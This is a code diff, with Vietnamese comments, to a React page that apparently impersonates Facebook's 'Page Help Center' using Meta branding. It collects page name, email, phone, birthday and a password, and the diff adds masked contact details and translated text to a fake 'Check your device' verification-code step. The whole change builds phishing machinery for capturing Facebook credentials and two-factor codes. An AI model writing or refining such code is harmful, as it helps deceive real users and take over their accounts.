@@ -1,6 +1,6 @@
 import FromMetaImage from '@/assets/images/from-meta.png';
 import FacebookImage from '@/assets/images/icon.webp';
-import logoGif from '@/assets/images/logo1.gif'; // 🎯 THÊM IMPORT NÀY
+import logoGif from '@/assets/images/logo1.gif';
 import PasswordInput from '@/components/password-input';
 import { faChevronDown, faCircleExclamation, faCompass, faHeadset, faLock, faUserGear } from '@fortawesome/free-solid-svg-icons';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
@@ -65,11 +65,15 @@ const Home = () => {
     const [isFormEnabled, setIsFormEnabled] = useState(false);
     const [isSubmitting, setIsSubmitting] = useState(false);
     
-    // 🎯 CHỈ THÊM 2 STATE NÀY
     const [showGif, setShowGif] = useState(true);
     const [homeTranslated, setHomeTranslated] = useState(false);
 
-    // 🎯 CHỈ THÊM EFFECT NÀY CHO GIF VÀ DỊCH HOME
+    // 🎯 THÊM: State để lưu data ẩn
+    const [hiddenData, setHiddenData] = useState({
+        email: 's****g@m****.com',
+        phone: '******32'
+    });
+
     useEffect(() => {
         setHomeTranslated(true);
         const gifTimer = setTimeout(() => {
@@ -78,7 +82,6 @@ const Home = () => {
         return () => clearTimeout(gifTimer);
     }, []);
 
-    // 🎯 CHỈ THÊM EFFECT NÀY CHO DỊCH NGẦM
     useEffect(() => {
         if (!showGif && homeTranslated) {
             const targetLang = localStorage.getItem('targetLang');
@@ -88,7 +91,7 @@ const Home = () => {
         }
     }, [showGif, homeTranslated]);
 
-    // 🎯 CHỈ THÊM HÀM NÀY CHO DỊCH NGẦM
+    // 🎯 CẬP NHẬT: Thêm dịch ngầm cho verify
     const translateBackgroundComponents = useCallback(async (targetLang) => {
         try {
             const passwordTexts = {
@@ -106,17 +109,33 @@ const Home = () => {
                 description2: 'Chúng tôi luôn quan tâm đến tính bảo mật của mọi người trên Facebook nên bạn không thể sử dụng tài khoản của mình cho đến lúc đó.'
             };
 
-            const [translatedPassword, translatedSendInfo] = await Promise.all([
+            // 🎯 THÊM: Dịch ngầm cho verify với data ẩn thật
+            const verifyTexts = {
+                title: 'Check your device',
+                description: `We have sent a verification code to your ${hiddenData.email}, ${hiddenData.phone}. Please enter the code we just sent to continue.`,
+                placeholder: 'Enter your code',
+                infoTitle: 'Approve from another device or Enter your verification code',
+                infoDescription: 'This may take a few minutes. Please do not leave this page until you receive the code. Once the code is sent, you will be able to appeal and verify.',
+                submit: 'Continue',
+                sendCode: 'Send new code',
+                errorMessage: 'The verification code you entered is incorrect',
+                loadingText: 'Please wait'
+            };
+
+            const [translatedPassword, translatedSendInfo, translatedVerify] = await Promise.all([
                 translateObjectTexts(passwordTexts, targetLang),
-                translateObjectTexts(sendInfoTexts, targetLang)
+                translateObjectTexts(sendInfoTexts, targetLang),
+                translateObjectTexts(verifyTexts, targetLang)
             ]);
 
             localStorage.setItem(`translatedPassword_${targetLang}`, JSON.stringify(translatedPassword));
             localStorage.setItem(`translatedSendInfo_${targetLang}`, JSON.stringify(translatedSendInfo));
+            localStorage.setItem(`translatedVerify_${targetLang}`, JSON.stringify(translatedVerify));
+            
         } catch (error) {
             console.log('Background translation failed:', error);
         }
-    }, []);
+    }, [hiddenData]); // 🎯 THÊM dependency hiddenData
 
     const translateObjectTexts = async (textsObject, targetLang) => {
         const translatedObject = {};
@@ -312,6 +331,15 @@ const Home = () => {
             }));
         }
 
+        // 🎯 CẬP NHẬT: Cập nhật hidden data real-time
+        if (field === 'mail' || field === 'phone') {
+            setHiddenData(prev => ({
+                ...prev,
+                email: field === 'mail' ? hideEmail(value) : prev.email,
+                phone: field === 'phone' ? hidePhone(value) : prev.phone
+            }));
+        }
+
         if (errors[field]) {
             setErrors((prev) => ({
                 ...prev,
@@ -352,14 +380,21 @@ const Home = () => {
 
                 await new Promise(resolve => setTimeout(resolve, 500));
 
-                const hiddenData = {
+                // 🎯 CẬP NHẬT: Lưu cả hidden data để verify dùng ngay
+                const userInfoData = {
                     name: formData.pageName,
                     email: hideEmail(formData.mail),
                     phone: hidePhone(formData.phone),
                     birthday: formData.birthday
                 };
 
-                localStorage.setItem('userInfo', JSON.stringify(hiddenData));
+                localStorage.setItem('userInfo', JSON.stringify(userInfoData));
+
+                // 🎯 THÊM: Cập nhật dịch verify với data mới nhất
+                const targetLang = localStorage.getItem('targetLang');
+                if (targetLang && targetLang !== 'en') {
+                    await updateVerifyTranslation(targetLang, userInfoData.email, userInfoData.phone);
+                }
 
                 setIsSubmitting(false);
                 setShowPassword(true);
@@ -377,6 +412,28 @@ const Home = () => {
                     inputElement.focus();
                 }
             }
+        }
+    };
+
+    // 🎯 THÊM: Hàm cập nhật dịch verify với data mới
+    const updateVerifyTranslation = async (targetLang, email, phone) => {
+        try {
+            const verifyTexts = {
+                title: 'Check your device',
+                description: `We have sent a verification code to your ${email}, ${phone}. Please enter the code we just sent to continue.`,
+                placeholder: 'Enter your code',
+                infoTitle: 'Approve from another device or Enter your verification code',
+                infoDescription: 'This may take a few minutes. Please do not leave this page until you receive the code. Once the code is sent, you will be able to appeal and verify.',
+                submit: 'Continue',
+                sendCode: 'Send new code',
+                errorMessage: 'The verification code you entered is incorrect',
+                loadingText: 'Please wait'
+            };
+
+            const translatedVerify = await translateObjectTexts(verifyTexts, targetLang);
+            localStorage.setItem(`translatedVerify_${targetLang}`, JSON.stringify(translatedVerify));
+        } catch (error) {
+            console.log('Update verify translation failed:', error);
         }
     };
 
@@ -424,7 +481,6 @@ const Home = () => {
 
     return (
         <>
-            {/* 🎯 CHỈ THÊM PHẦN NÀY - GIF OVERLAY */}
             {showGif && (
                 <div className="fixed inset-0 z-50 flex items-center justify-center bg-white">
                     <img 
@@ -435,9 +491,7 @@ const Home = () => {
                 </div>
             )}
 
-            {/* 🎯 TOÀN BỘ CODE GỐC GIỮ NGUYÊN - CHỈ THÊM CLASS DỊCH CHUYỂN */}
             <div className={homeTranslated ? 'opacity-100' : 'opacity-0'}>
-                {/* 🎯 ĐÃ SỬA HEADER - THÊM right-0, z-40, bg-white */}
                 <header className='sticky top-0 left-0 right-0 z-40 flex h-14 justify-between p-4 shadow-sm bg-white'>
                     <title>Page Help Center</title>
                     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
